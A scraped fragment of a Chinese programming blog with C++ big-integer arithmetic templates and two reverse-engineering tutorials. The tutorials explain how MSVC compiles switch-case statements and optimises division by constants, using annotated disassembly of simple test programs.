由于大整数除法是从高位开始做运算的，因此为了统一大整数的存储格式，其最后运算的结果要使用reverse(vector.begin(), vector.end())来做逆置操作 算法模板 大整数加法 迭代式 12345678910111213141516171819202122232425262728293031// A &gt;= 0, B &gt;= 0vector&lt;int&gt; add(const vector&lt;int&gt;&amp; A, const vector&lt;int&gt;&amp; B) &#123; vector&lt;int&gt; ans; int carry = 0; // 由于没有判断A和B哪个位数更长，而加法运算需要对每一个数位上的值都要加上一遍 // 因此不能提前退出，使用或条件 for (int i = 0; i &lt; A.size() || i &lt; B.size(); ++i) &#123; int result = carry; // 当要加上的整数还没运算完时，加上对应的位置上的整数 if (i &lt; A.size()) &#123; result += A[i]; &#125; if (i &lt; B.size()) &#123; result += B[i]; &#125; // 对10取模，得到该位置上的值 ans.push_back(result % 10); // 计算进位 carry = result / 10; &#125; // 当还有进位的时候，证明需要在最高位补上一个1 if (carry) &#123; ans.push_back(carry); &#125; return ans;&#125; 递归式 1234567891011121314151617181920212223242526272829vector&lt;int&gt; add(const vector&lt;int&gt;&amp; A, const vector&lt;int&gt;&amp; B) &#123; // 让竖式计算的最上面的那个整数是最长的 if (A.size() &lt; B.size()) &#123; return add(B, A); &#125; vector&lt;int&gt; ans; int carry = 0; for (int i = 0; i &lt; A.size(); ++i) &#123; int result = carry + A[i]; // 当要加上的整数还没运算完时，加上对应的位置上的整数 if (i &lt; B.size()) &#123; result += B[i]; &#125; // 对10取模，得到该位置上的值 ans.push_back(result % 10); // 计算进位 carry = result / 10; &#125; // 当还有进位的时候，证明需要在最高位补上一个1 if (carry) &#123; ans.push_back(carry); &#125; return ans;&#125; 大整数减法 比较两个大整数谁大 12345678910111213141516171819// 比较大整数A是否不小于大整数Bbool cmp(const vector&lt;int&gt;&amp; A, const vector&lt;int&gt;&amp; B) &#123; if (A.size() != B.size()) &#123; return A.size() &gt;= B.size(); &#125; for (int i = A.size() - 1; i &gt;= 0; --i) &#123; // 这三个连续的if可以做优化，合并掉多余的操作 if (A[i] == B[i]) &#123; continue; &#125; else if (A[i] &gt; B[i]) &#123; return true; &#125; else &#123; return false; &#125; &#125; return true;&#125; for循环遍历的优化写法，省掉了多个分支判断： 12345678910111213141516// 比较大整数A是否不小于大整数Bbool cmp(const vector&lt;int&gt;&amp; A, const vector&lt;int&gt;&amp; B) &#123; if (A.size() != B.size()) &#123; return A.size() &gt;= B.size(); &#125; for (int i = A.size() - 1; i &gt;= 0; --i) &#123; // 根据上面的分支情况，可以归结为，当两个值不等时，比较它俩的大小 // 因此可以写成下面的这种情况 if (A[i] != B[i]) &#123; return A[i] &gt; B[i]; &#125; &#125; return true;&#125; 大整数减法模板 12345678910111213141516171819202122232425262728293031323334353637383940414243/* 先利用大整数比较，来将问题转为A - B的情况vector&lt;int&gt; ans;// 比较A是否不小于大整数Bif (cmp(A, B) == true) &#123; ans = sub(A, B); &#125; else &#123; ans = sub(B, A); printf(&quot;-&quot;);&#125;*/vector&lt;int&gt; sub(const vector&lt;int&gt;&amp; A, const vector&lt;int&gt;&amp; B) &#123; vector&lt;int&gt; ans; // A一定不小于B，初始时，没有借位 int carry = 0; for (int i = 0; i &lt; A.size(); ++i) &#123; // 初始时是个位进行相减，假设当前并没有借位，所以初始的借位值carry为0 int tmp = A[i] - carry; // 当B还没减完时，需要继续减，变为A[i] - B[i] if (i &lt; B.size()) &#123; tmp = tmp - B[i]; &#125; // 当A[i] - B[i]的值小于0时，则A[i + 1]需要减去1 // 因此需要将借位标志carry记为1，在下次循环时将借位减掉 // 下列分支其实可以进行优化 if (tmp &lt; 0) &#123; carry = 1; ans.push_back((tmp + 10) % 10); &#125; else &#123; carry = 0; ans.push_back(tmp % 10); &#125; &#125; // 如果高位都是0，则要将这些前导0都要删掉，如果最后结果就是0，则最后一个0不能弹出 while (ans.size() &gt; 1 &amp;&amp; ans.back() == 0) &#123; ans.pop_back(); &#125; return ans;&#125; 上述将两个数的各个位相减后的结果存储在结果数组中时，使用了分支结构。根据其功能以及取模操作%的数学含义，其实可以将上述分支取消掉，只保留计算借位标志carry的分支即可，变为： 123456789101112131415161718192021222324252627282930313233343536373839404142434445/* 先利用大整数比较，来将问题转为A - B的情况vector&lt;int&gt; ans;// 比较A是否不小于大整数Bif (cmp(A, B) == true) &#123; ans = sub(A, B); &#125; else &#123; ans = sub(B, A); printf(&quot;-&quot;);&#125;*/vector&lt;int&gt; sub(const vector&lt;int&gt;&amp; A, const vector&lt;int&gt;&amp; B) &#123; vector&lt;int&gt; ans; // A一定不小于B，初始时，没有借位 int carry = 0; for (int i = 0; i &lt; A.size(); ++i) &#123; // 初始时是个位进行相减，假设当前并没有借位，所以初始的借位值carry为0 int tmp = A[i] - carry; // 当B还没减完时，需要继续减，变为A[i] - B[i] if (i &lt; B.size()) &#123; tmp = tmp - B[i]; &#125; // 当tmp &lt; 0 时，加上10取余没毛病； // 当tmp &gt;= 0时，由于10 % 10 == 0，所以不影响最终结果 // 故存放的还是tmp % 10其本身，所以可以去掉那个分支结构 ans.push_back((tmp + 10) % 10); // 当A[i] - B[i]的值小于0时，则A[i + 1]需要减去1 // 因此需要将借位标志carry记为1，在下次循环时将借位减掉 if (tmp &lt; 0) &#123; carry = 1; &#125; else &#123; carry = 0; &#125; &#125; // 如果高位都是0，则要将这些前导0都要删掉，如果最后结果就是0，则最后一个0不能弹出 while (ans.size() &gt; 1 &amp;&amp; ans.back() == 0) &#123; ans.pop_back(); &#125; return ans;&#125; 大整数乘法 123456789101112131415161718192021222324252627vector&lt;int&gt; mul(const vector&lt;int&gt;&amp; A, const int&amp; B) &#123; vector&lt;int&gt; ans; int result = 0; // 当A的各个位都已经乘完乘数后，如果还有进位 // 则将进位的整数分解成若干个整数存放到答案数组中 // 因为A[i] * B的进位可以不只是1位数，可能是多位的整数 for (int i = 0; i &lt; A.size() || result; ++i) &#123; if (i &lt; A.size()) &#123; result += A[i] * B; &#125; // 求当前位置上应该留下的值 ans.push_back(result % 10); // 求进位了多少值，与加法的很类似，但是加法最多进位是1 // 而大整数乘法它的进位不一定是1，可能是具有若干个位的整数 result = result / 10; &#125; // 如果B为0，则需要将前导0去除，其实这个特殊情况可以放到函数入口处先判断 // 可以不进入那个循环，提升效率 while (ans.size() &gt; 1 &amp;&amp; ans.back() == 0) &#123; ans.pop_back(); &#125; return ans;&#125; 将上述代码优化后，可以提升效率： 123456789101112131415161718192021222324vector&lt;int&gt; mul(const vector&lt;int&gt;&amp; A, const int&amp; B) &#123; vector&lt;int&gt; ans; if (B == 0) &#123; ans.push_back(0); return ans; &#125; int result = 0; // 当A的各个位都已经乘完乘数后，如果还有进位 // 则将进位的整数分解成若干个整数存放到答案数组中 // 因为A[i] * B的进位可以不只是1位数，可能是多位的整数 for (int i = 0; i &lt; A.size() || result; ++i) &#123; if (i &lt; A.size()) &#123; result += A[i] * B; &#125; // 求当前位置上应该留下的值 ans.push_back(result % 10); // 求进位了多少值 result = result / 10; &#125; return ans;&#125; 上述代码的for循环的终止条件使用了一个或条件，其为了省略一个循环，如果不添加或条件，需要额外添加一个循环如下所示： 12345678910111213141516171819202122232425vector&lt;int&gt; mul(const vector&lt;int&gt;&amp; A, const int&amp; B) &#123; vector&lt;int&gt; ans; if (B == 0) &#123; ans.push_back(0); return ans; &#125; int result = 0; // 当A的各个位都已经乘完乘数后，如果还有进位 // 则将进位的整数分解成若干个整数存放到答案数组中 // 因为A[i] * B的进位可以不只是1位数，可能是多位的整数 for (int i = 0; i &lt; A.size(); ++i) &#123; result += A[i] * B; // 求当前位置上应该留下的值 ans.push_back(result % 10); // 求进位了多少值 result = result / 10; &#125; while (result) &#123; ans.push_back(result % 10); result = result / 10; &#125; return ans;&#125; 大整数除法 要求除数一定不为0，且A为高精度整数，b为低精度整数，且A和b都为非负数，A不小于b。 其实思想很简单，就是模拟竖式除法。模拟的方法有很多，但是其中比较简单的一个思路是从余数下手。设除数为B，余数为r，商为q，从被除数的最高位开始计算，有： 竖式除法中，每次运算求出一位商的时候，都是先计算上一步运算后得到的余数。而当前的余数应该是 根据当前的余数，计算当前步的商和余数，其中商为，余数为 不断的根据上面的步骤来进行迭代，直到被除数的每一位都参与运算过 计算完毕后，由于大整数存储是按照小端方式存放，因此需要将结果逆置后再输出。 代码模板为： 12345678910111213141516171819202122vector&lt;int&gt; div(const vector&lt;int&gt;&amp; A, int b, int&amp; r) &#123; vector&lt;int&gt; q; // r为余数，且为哨兵 r = 0; for (int i = A.size() - 1; i &gt;= 0; --i) &#123; r = r * 10 + A[i]; q.push_back(r / b); r = r % b; &#125; // 由于大整数的存储是按照小端序存储的，因此需要将最后的结果逆置 reverse(q.begin(), q.end()); // 去除前导0 while (q.size() &gt; 1 &amp;&amp; q.back() == 0) &#123; q.pop_back(); &#125; return q;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"https://4st.tech/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"高精度","slug":"高精度","permalink":"https://4st.tech/tags/%E9%AB%98%E7%B2%BE%E5%BA%A6/"},{"name":"加法","slug":"加法","permalink":"https://4st.tech/tags/%E5%8A%A0%E6%B3%95/"},{"name":"减法","slug":"减法","permalink":"https://4st.tech/tags/%E5%87%8F%E6%B3%95/"},{"name":"乘法","slug":"乘法","permalink":"https://4st.tech/tags/%E4%B9%98%E6%B3%95/"},{"name":"除法","slug":"除法","permalink":"https://4st.tech/tags/%E9%99%A4%E6%B3%95/"},{"name":"大整数运算","slug":"大整数运算","permalink":"https://4st.tech/tags/%E5%A4%A7%E6%95%B4%E6%95%B0%E8%BF%90%E7%AE%97/"},{"name":"大整数加法","slug":"大整数加法","permalink":"https://4st.tech/tags/%E5%A4%A7%E6%95%B4%E6%95%B0%E5%8A%A0%E6%B3%95/"},{"name":"大整数减法","slug":"大整数减法","permalink":"https://4st.tech/tags/%E5%A4%A7%E6%95%B4%E6%95%B0%E5%87%8F%E6%B3%95/"},{"name":"大整数乘法","slug":"大整数乘法","permalink":"https://4st.tech/tags/%E5%A4%A7%E6%95%B4%E6%95%B0%E4%B9%98%E6%B3%95/"},{"name":"大整数除法","slug":"大整数除法","permalink":"https://4st.tech/tags/%E5%A4%A7%E6%95%B4%E6%95%B0%E9%99%A4%E6%B3%95/"},{"name":"C++大整数运算","slug":"C-大整数运算","permalink":"https://4st.tech/tags/C-%E5%A4%A7%E6%95%B4%E6%95%B0%E8%BF%90%E7%AE%97/"}]},{"title":"switch-case逆向分析与还原","slug":"switch-case逆向分析与还原","date":"2021-08-07T04:51:38.000Z","updated":"2021-08-07T04:55:30.755Z","comments":true,"path":"2021/08/07/switch-case-ni-xiang-fen-xi-yu-huan-yuan/","link":"","permalink":"https://4st.tech/2021/08/07/switch-case-ni-xiang-fen-xi-yu-huan-yuan/","excerpt":"","text":"大纲 case的数量小于等于3个，且case值连续 case的数量大于3个，但case值较为连续，即：最大case值和最小case值之间的间隔不大于7 case的数量大于3个，且case值相隔较大，且最大case值和最小case值之间的间隔不能超过255 case的值大于3个，且case值较为离散。 混合方案。当不能单独用上述4种优化方案时使用。当个数小于等于3个，直接比较就行了，就不再进行折半查找了。 测试环境 MSVC + VC6 + Release，速度优先编译选项。选用VC6的原因是编译器没有其他额外的操作，如：安全cookie之类的信息，方便观察。其实switch-case的这几种方式在VS2019中也是一样的 优化方案一：直接if-else 适用于：case的数量小于等于3个，且case值连续的情况。 测试代码： 123456789101112131415int main(int argc, char* argv[])&#123; switch (argc) &#123; case 1: printf(&quot;case 1&quot;); break; case 2: printf(&quot;case 2&quot;); break; case 3: printf(&quot;case 3&quot;); &#125; return 0;&#125; 反汇编结果： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401000 _main proc near ; CODE XREF: start+AFp.text:00401000.text:00401000 arg_0 = dword ptr 4.text:00401000.text:00401000 mov eax, [esp+arg_0].text:00401004 dec eax.text:00401005 jz short LBL_CASE1.text:00401005.text:00401007 dec eax.text:00401008 jz short LBL_CASE2.text:00401008.text:0040100A dec eax.text:0040100B jnz short LBL_EXIT.text:0040100D LBL_CASE3: ; &quot;case 3&quot;.text:0040100D push offset s-&gt;Case3.text:00401012 call printf.text:00401012.text:00401017 add esp, 4.text:0040101A xor eax, eax.text:0040101C retn.text:0040101C.text:0040101D ; ---------------------------------------------------------------------------.text:0040101D.text:0040101D LBL_CASE2: ; CODE XREF: _main+8j.text:0040101D push offset s-&gt;Case2 ; &quot;case 2&quot;.text:00401022 call printf.text:00401022.text:00401027 add esp, 4.text:0040102A xor eax, eax.text:0040102C retn.text:0040102C.text:0040102D ; ---------------------------------------------------------------------------.text:0040102D.text:0040102D LBL_CASE1: ; CODE XREF: _main+5j.text:0040102D push offset s-&gt;Case1 ; &quot;case 1&quot;.text:00401032 call printf.text:00401032.text:00401037 add esp, 4.text:00401037.text:0040103A.text:0040103A LBL_EXIT: ; CODE XREF: _main+Bj.text:0040103A xor eax, eax.text:0040103C retn.text:0040103C.text:0040103C _main endp 可以发现，其为了提高速度，其直接将共有的退出代码： 12xor eax, eaxretn 放到了各个case后面，直接退出了。 其在比较到底是选择哪个case的时候，与if-else的差不多： 123456cmp xxxxjz xxxx ; 跳转到对应的case代码块cmp xxxxjz xxxxcmp xxxxjnz xxxx ; default / case_end 当没有break的时候，则生成的引导表是按照你写的顺序；如果有break，则顺序就无所谓了。 优化方案二：跳转表方案 适用于：case的数量大于3个，但case值较为连续，即：最大case值和最小case值之间的间隔不大于7的情况。 实验代码： 123456789101112131415161718192021222324252627int main(int argc, char* argv[])&#123; switch (argc) &#123; case 1: printf(&quot;case 1&quot;); break; case 2: printf(&quot;case 2&quot;); break; case 3: printf(&quot;case 3&quot;); break; case 4: printf(&quot;case 4&quot;); break; case 5: printf(&quot;case 5&quot;); break; case 6: printf(&quot;case 6&quot;); break; default: printf(&quot;default&quot;); &#125; return 0; &#125; 反汇编结果： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401000 _main proc near ; CODE XREF: start+AFp.text:00401000.text:00401000 arg_0 = dword ptr 4.text:00401000.text:00401000 mov eax, [esp+arg_0].text:00401004 dec eax.text:00401005 cmp eax, 5 ; switch 6 cases.text:00401008 ja short LBL_DEFAULT ; jumptable 0040100A default case.text:00401008.text:0040100A jmp ds:aryJumpTable[eax*4] ; switch jump.text:0040100A.text:00401011.text:00401011 LBL_CASE1: ; DATA XREF: .text:aryJumpTableo.text:00401011 push offset s-&gt;Case1 ; jumptable 0040100A case 0.text:00401016 call printf.text:00401016.text:0040101B add esp, 4.text:0040101E xor eax, eax.text:00401020 retn.text:00401020.text:00401021 ; ---------------------------------------------------------------------------.text:00401021.text:00401021 LBL_CASE2: ; CODE XREF: _main+Aj.text:00401021 ; DATA XREF: .text:aryJumpTableo.text:00401021 push offset s-&gt;Case2 ; jumptable 0040100A case 1.text:00401026 call printf.text:00401026.text:0040102B add esp, 4.text:0040102E xor eax, eax.text:00401030 retn.text:00401030.text:00401031 ; ---------------------------------------------------------------------------.text:00401031.text:00401031 LBL_CASE3: ; CODE XREF: _main+Aj.text:00401031 ; DATA XREF: .text:aryJumpTableo.text:00401031 push offset s-&gt;Case3 ; jumptable 0040100A case 2.text:00401036 call printf.text:00401036.text:0040103B add esp, 4.text:0040103E xor eax, eax.text:00401040 retn.text:00401040.text:00401041 ; ---------------------------------------------------------------------------.text:00401041.text:00401041 LBL_CASE4: ; CODE XREF: _main+Aj.text:00401041 ; DATA XREF: .text:aryJumpTableo.text:00401041 push offset s-&gt;Case4 ; jumptable 0040100A case 3.text:00401046 call printf.text:00401046.text:0040104B add esp, 4.text:0040104E xor eax, eax.text:00401050 retn.text:00401050.text:00401051 ; ---------------------------------------------------------------------------.text:00401051.text:00401051 LBL_CASE5: ; CODE XREF: _main+Aj.text:00401051 ; DATA XREF: .text:aryJumpTableo.text:00401051 push offset s-&gt;Case5 ; jumptable 0040100A case 4.text:00401056 call printf.text:00401056.text:0040105B add esp, 4.text:0040105E xor eax, eax.text:00401060 retn.text:00401060.text:00401061 ; ---------------------------------------------------------------------------.text:00401061.text:00401061 LBL_CASE6: ; CODE XREF: _main+Aj.text:00401061 ; DATA XREF: .text:aryJumpTableo.text:00401061 push offset s-&gt;Case6 ; jumptable 0040100A case 5.text:00401066 call printf.text:00401066.text:0040106B add esp, 4.text:0040106E xor eax, eax.text:00401070 retn.text:00401070.text:00401071 ; ---------------------------------------------------------------------------.text:00401071.text:00401071 LBL_DEFAULT: ; CODE XREF: _main+8j.text:00401071 push offset s-&gt;Default ; jumptable 0040100A default case.text:00401076 call printf.text:00401076.text:0040107B add esp, 4.text:0040107E xor eax, eax.text:00401080 retn.text:00401080.text:00401080 _main endp.text:00401080.text:00401080 ; ---------------------------------------------------------------------------.text:00401081 align 4.text:00401084 aryJumpTable dd offset LBL_CASE1 ; DATA XREF: _main+Ar.text:00401084 dd offset LBL_CASE2 ; jump table for switch statement.text:00401084 dd offset LBL_CASE3.text:00401084 dd offset LBL_CASE4.text:00401084 dd offset LBL_CASE5.text:00401084 dd offset LBL_CASE6.text:0040109C align 10h 跳转表jumpTable是个指针数组，里面存放着各个CASE的地址： 123456.text:00401084 aryJumpTable dd offset LBL_CASE1 ; DATA XREF: _main+Ar.text:00401084 dd offset LBL_CASE2 ; jump table for switch statement.text:00401084 dd offset LBL_CASE3.text:00401084 dd offset LBL_CASE4.text:00401084 dd offset LBL_CASE5.text:00401084 dd offset LBL_CASE6 在switch-case的入口处： 123456.text:00401000 mov eax, [esp+arg_0].text:00401004 dec eax.text:00401005 cmp eax, 5 ; switch 6 cases.text:00401008 ja short LBL_DEFAULT ; jumptable 0040100A default case.text:00401008.text:0040100A jmp ds:aryJumpTable[eax*4] ; switch jump 可以发现其为了利用跳转表的下标来进行寻址，需要将case值与数组下标相对应，因此需要减掉最小的那个case值。在本例中，也就是需要减掉最小的case值1，因此在入口处，首先将要测试的值减去1，然后与最大下标进行比较，如果大于，则说明是不在case范围内，直接跳转到default处进行处理即可，否则直接利用数组下标寻址公式来进行寻址到正确的case地址即可。 由于是使用的指针数组来进行寻址的，所以当case打乱的情况下，其填充进该数组中也是有序的，所以在生成跳转表的时候，跟你是否写的有序无关。 还原时，别忘了将case值加上最小的那个case值，才能得到真正的case值。 优化方案3：索引表和跳转表组合方案 适用于：case的数量大于3个，且case值相隔较大，且最大case值和最小case值之间的间隔不能超过255的情况。 实验代码： 123456789101112131415161718192021222324252627int main(int argc, char* argv[])&#123; switch (argc) &#123; case 40: printf(&quot;case 40&quot;); break; case 91: printf(&quot;case 91&quot;); break; case 62: printf(&quot;case 62&quot;); break; case 73: printf(&quot;case 73&quot;); break; case 14: printf(&quot;case 14&quot;); break; case 25: printf(&quot;case 25&quot;); break; default: printf(&quot;default&quot;); &#125; return 0; &#125; 对于该实验代码，其在跳转表的基础上，又多了一张表，其大小为1个字节，即：可以表示的最大范围是0 - 255, 12345678.text:00401000 mov eax, [esp+arg_0].text:00401004 add eax, 0FFFFFFF2h.text:00401007 cmp eax, 4Dh ; switch 78 cases.text:0040100A ja short LBL_DEFAULT ; jumptable 00401014 default case.text:0040100A.text:0040100C xor ecx, ecx.text:0040100E mov cl, ds:indexTable[eax].text:00401014 jmp ds:jumpTable[ecx*4] ; switch jump 对应的两张表分别为： 12345678910111213141516.text:0040108C jumpTable dd offset loc_40105B ; DATA XREF: _main+14r.text:0040108C dd offset loc_40106B ; jump table for switch statement.text:0040108C dd offset loc_40101B.text:0040108C dd offset loc_40103B.text:0040108C dd offset loc_40104B.text:0040108C dd offset loc_40102B.text:0040108C dd offset LBL_DEFAULT.text:004010A8 indexTable db 0,6,6,6,6,6,6,6,6,6 ; DATA XREF: _main+Er.text:004010A8 db 6,1,6,6,6,6,6,6,6,6 ; indirect table for switch statement.text:004010A8 db 6,6,6,6,6,6,2,6,6,6.text:004010A8 db 6,6,6,6,6,6,6,6,6,6.text:004010A8 db 6,6,6,6,6,6,6,6,3,6.text:004010A8 db 6,6,6,6,6,6,6,6,6,4.text:004010A8 db 6,6,6,6,6,6,6,6,6,6.text:004010A8 db 6,6,6,6,6,6,6,5 可以发现，在索引表indexTable中，6代表的是跳转表的下标，即：LBL_DEFAULT 。因此在还原时，只需要先查索引表，然后加上最小的case值，即可还原。 优化方案四：二叉排序树方案 实验代码： 123456789101112131415161718192021222324252627int main(int argc, char* argv[])&#123; switch (argc) &#123; case 40: printf(&quot;case 40&quot;); break; case 91: printf(&quot;case 91&quot;); break; case 62: printf(&quot;case 62&quot;); break; case 296: printf(&quot;case 73&quot;); break; case 289: printf(&quot;case 14&quot;); break; case 257: printf(&quot;case 257&quot;); break; default: printf(&quot;default&quot;); &#125; return 0; &#125; 反汇编结果： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401000 _main proc near ; CODE XREF: start+AFp.text:00401000.text:00401000 arg_0 = dword ptr 4.text:00401000.text:00401000 mov eax, [esp+arg_0].text:00401004 cmp eax, 257.text:00401009 jg short LBL_NEXT_BRANCH.text:00401009.text:0040100B jz short LBL_CASE257.text:0040100B.text:0040100D cmp eax, 40.text:00401010 jz short LBL_CASE40.text:00401010.text:00401012 cmp eax, 62.text:00401015 jz short LBL_CASE62.text:00401015.text:00401017 cmp eax, 91.text:0040101A jnz short LBL_DEFAULT.text:0040101A.text:0040101C push offset s-&gt;Case91 ; &quot;case 91&quot;.text:00401021 call printf.text:00401021.text:00401026 add esp, 4.text:00401029 xor eax, eax.text:0040102B retn.text:0040102B.text:0040102C ; ---------------------------------------------------------------------------.text:0040102C.text:0040102C LBL_CASE62: ; CODE XREF: _main+15j.text:0040102C push offset s-&gt;Case62 ; &quot;case 62&quot;.text:00401031 call printf.text:00401031.text:00401036 add esp, 4.text:00401039 xor eax, eax.text:0040103B retn.text:0040103B.text:0040103C ; ---------------------------------------------------------------------------.text:0040103C.text:0040103C LBL_CASE40: ; CODE XREF: _main+10j.text:0040103C push offset s-&gt;Case40 ; &quot;case 40&quot;.text:00401041 call printf.text:00401041.text:00401046 add esp, 4.text:00401049 xor eax, eax.text:0040104B retn.text:0040104B.text:0040104C ; ---------------------------------------------------------------------------.text:0040104C.text:0040104C LBL_CASE257: ; CODE XREF: _main+Bj.text:0040104C push offset s-&gt;Case257 ; &quot;case 257&quot;.text:00401051 call printf.text:00401051.text:00401056 add esp, 4.text:00401059 xor eax, eax.text:0040105B retn.text:0040105B.text:0040105C ; ---------------------------------------------------------------------------.text:0040105C.text:0040105C LBL_NEXT_BRANCH: ; CODE XREF: _main+9j.text:0040105C sub eax, 289.text:00401061 jz short LBL_CASE289.text:00401061.text:00401063 sub eax, 7.text:00401066 jz short LBL_CASE73.text:00401066.text:00401068.text:00401068 LBL_DEFAULT: ; CODE XREF: _main+1Aj.text:00401068 push offset s-&gt;Default ; &quot;default&quot;.text:0040106D call printf.text:0040106D.text:00401072 add esp, 4.text:00401075 xor eax, eax.text:00401077 retn.text:00401077.text:00401078 ; ---------------------------------------------------------------------------.text:00401078.text:00401078 LBL_CASE73: ; CODE XREF: _main+66j.text:00401078 push offset s-&gt;Case73 ; &quot;case 73&quot;.text:0040107D call printf.text:0040107D.text:00401082 add esp, 4.text:00401085 xor eax, eax.text:00401087 retn.text:00401087.text:00401088 ; ---------------------------------------------------------------------------.text:00401088.text:00401088 LBL_CASE289: ; CODE XREF: _main+61j.text:00401088 push offset s-&gt;Case14 ; &quot;case 14&quot;.text:0040108D call printf.text:0040108D.text:00401092 add esp, 4.text:00401095 xor eax, eax.text:00401097 retn.text:00401097.text:00401097 _main endp 发现其使用的就是二叉排序树的形式来进行的，这样的话通过折半查找，几次之后就能得到最终要执行的那一个case分支，查找效率较大的提高。 该方案的代码定式就是： 1234cmpjzjg; // 两轮判断下来，最后肯定执行的是小于的那一分支 还原时就是抓住jz指令即可还原 优化方案五：混合优化 在实际应用中，几乎不会出现单一的优化形式，是上述4种方式的混合方案，不再赘述。","categories":[{"name":"C/C++逆向","slug":"C-C-逆向","permalink":"https://4st.tech/categories/C-C-%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://4st.tech/tags/%E9%80%86%E5%90%91/"},{"name":"switch-case","slug":"switch-case","permalink":"https://4st.tech/tags/switch-case/"},{"name":"switch-case还原","slug":"switch-case还原","permalink":"https://4st.tech/tags/switch-case%E8%BF%98%E5%8E%9F/"}]},{"title":"C/C++除法的非常规优化及其识别与还原","slug":"C-C-除法的非常规优化及其识别与还原","date":"2021-08-04T03:26:39.000Z","updated":"2021-08-04T04:57:04.063Z","comments":true,"path":"2021/08/04/c-c-chu-fa-de-fei-chang-gui-you-hua-ji-qi-shi-bie-yu-huan-yuan/","link":"","permalink":"https://4st.tech/2021/08/04/c-c-chu-fa-de-fei-chang-gui-you-hua-ji-qi-shi-bie-yu-huan-yuan/","excerpt":"","text":"大纲 无符号数除以非2的幂的特殊情况 有符号数除以非2的幂的两种特殊情况 除数是正数，但是MagicNum为负 除数是负数，但是MagicNum为正 测试环境与编译选项均与上一篇常规情况相同。 无符号数除以非2的幂的特殊情况 测试代码： 12345int main(int argc, char* argv[])&#123; printf(&quot;%d&quot;, (unsigned int)argc / 7); return 0;&#125; 整理后对应的反汇编代码： 123456789101112131415161718192021.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401000 _main proc near ; CODE XREF: start+AF\u0019p.text:00401000.text:00401000 arg_0 = dword ptr 4.text:00401000.text:00401000 mov ecx, [esp+arg_0].text:00401004 mov eax, 24924925h.text:00401009 mul ecx.text:0040100B sub ecx, edx.text:0040100D shr ecx, 1.text:0040100F add ecx, edx.text:00401011 shr ecx, 2.text:00401014 push ecx.text:00401015 push offset s-&gt;D ; &quot;%d&quot;.text:0040101A call printf.text:0040101A.text:0040101F add esp, 8.text:00401022 xor eax, eax.text:00401024 retn.text:00401024.text:00401024 _main endp 在常规优化中，其代码定式应该是： 123mov eax, MagicNummul xshr edx, n 而在上述代码中，操作却不一致，这是为什么？上述操作又是在做什么？可以根据上述代码写出数学表达式进行化简来得到其结果，设ecx = arg0， C = 24924925h ，有： 化简可得到： 于是可以发现，其实就是编译器在计算MagicNum的时候，发现得到的结果用4个字节存放不下，多了一个进位出来，也就是​ 。所以在后序计算结果的时候，由于MagicNum是低4字节的结果，所以需要进行调整，在计算的时候需要先加上这个进位才能正确的得到结果。而它之所以拆分为上述情况，是因为要将除法转为周期更短的移位运算，进行了等价变换。 还原时需要将MagicNum加上 再进行还原即可。 有符号数除以非2的幂的两种特殊情况 出现这两种特殊情况的原因是，由于编译器在计算MagicNum的时候，是按照无符号数来进行运算的，但是在有符号数除法中需要使用有符号命令，此时得到的MagicNum可能会为负数，因此需要做调整；同理，其MagicNum本应该是负数，但是在计算过程中却被视为正数，因此也需要做调整，故有以下两种情况。 除数是正数，但是MagicNum为负 测试代码： 12345int main(int argc, char* argv[])&#123; printf(&quot;%d&quot;, argc / 7); return 0;&#125; 对应的反汇编结果为： 12345678910111213141516171819202122.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401000 _main proc near ; CODE XREF: start+AF\u0019p.text:00401000.text:00401000 arg_0 = dword ptr 4.text:00401000.text:00401000 mov ecx, [esp+arg_0].text:00401004 mov eax, 92492493h ; MagicNum为负数，因为大于0x7fff, ffff.text:00401009 imul ecx.text:0040100B add edx, ecx ; 对比之前的有符号数除以非2的幂多了这个操作.text:0040100D sar edx, 2.text:00401010 mov eax, edx.text:00401012 shr eax, 1Fh.text:00401015 add edx, eax.text:00401017 push edx.text:00401018 push offset s-&gt;D ; &quot;%d&quot;.text:0040101D call printf.text:0040101D.text:00401022 add esp, 8.text:00401025 xor eax, eax.text:00401027 retn.text:00401027.text:00401027 _main endp 将上述操作所描写的数学公式写出来并化简，可以得到以下式子： 其中，即：M是对C取补之后的结果，真是的MagicNum应该为正值。 其多添加的这一句add edx, ecx其实就是对无符号整数乘以有符号数做调整，而还原方法是直接按照正数的方法进行还原即可。 除数是负数，但是MagicNum为正 测试代码为： 12345int main(int argc, char* argv[])&#123; printf(&quot;%d&quot;, argc / -7); return 0;&#125; 反汇编结果为： 12345678910111213141516171819202122.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401000 _main proc near ; CODE XREF: start+AF\u0019p.text:00401000.text:00401000 arg_0 = dword ptr 4.text:00401000.text:00401000 mov ecx, [esp+arg_0].text:00401004 mov eax, 6DB6DB6Dh ; MagicNum为正数.text:00401009 imul ecx.text:0040100B sub edx, ecx ; 多出了一个减法操作.text:0040100D sar edx, 2.text:00401010 mov eax, edx.text:00401012 shr eax, 1Fh.text:00401015 add edx, eax.text:00401017 push edx.text:00401018 push offset s-&gt;D ; &quot;%d&quot;.text:0040101D call printf.text:0040101D.text:00401022 add esp, 8.text:00401025 xor eax, eax.text:00401027 retn.text:00401027.text:00401027 _main endp 同样，将上述运算写为数学表达式： 其中，即：真正的M是一个负值。 其还原方法还是先求补，再还原。 整体总结 总结一下识别方法： 在识别时，先观察是否有加1做调整的操作，如果有且运算指令使用的是有符号运算指令，则被除数是有符号数。 查看MagicNum是否是负数（大于等于0x8000,0000即为负数）。如果是负数，且未见加调整，则除数是负数；如果是正数，且有减调整，则除数是负数，需要先求补再进行还原；同理，如果是负数，且有加调整，除数是正数；如果是正数，且未有减调整，则除数是正数 对于还原方法，首先判断除数是正数还是负数来进行还原： 正数还原除数 负数还原除数 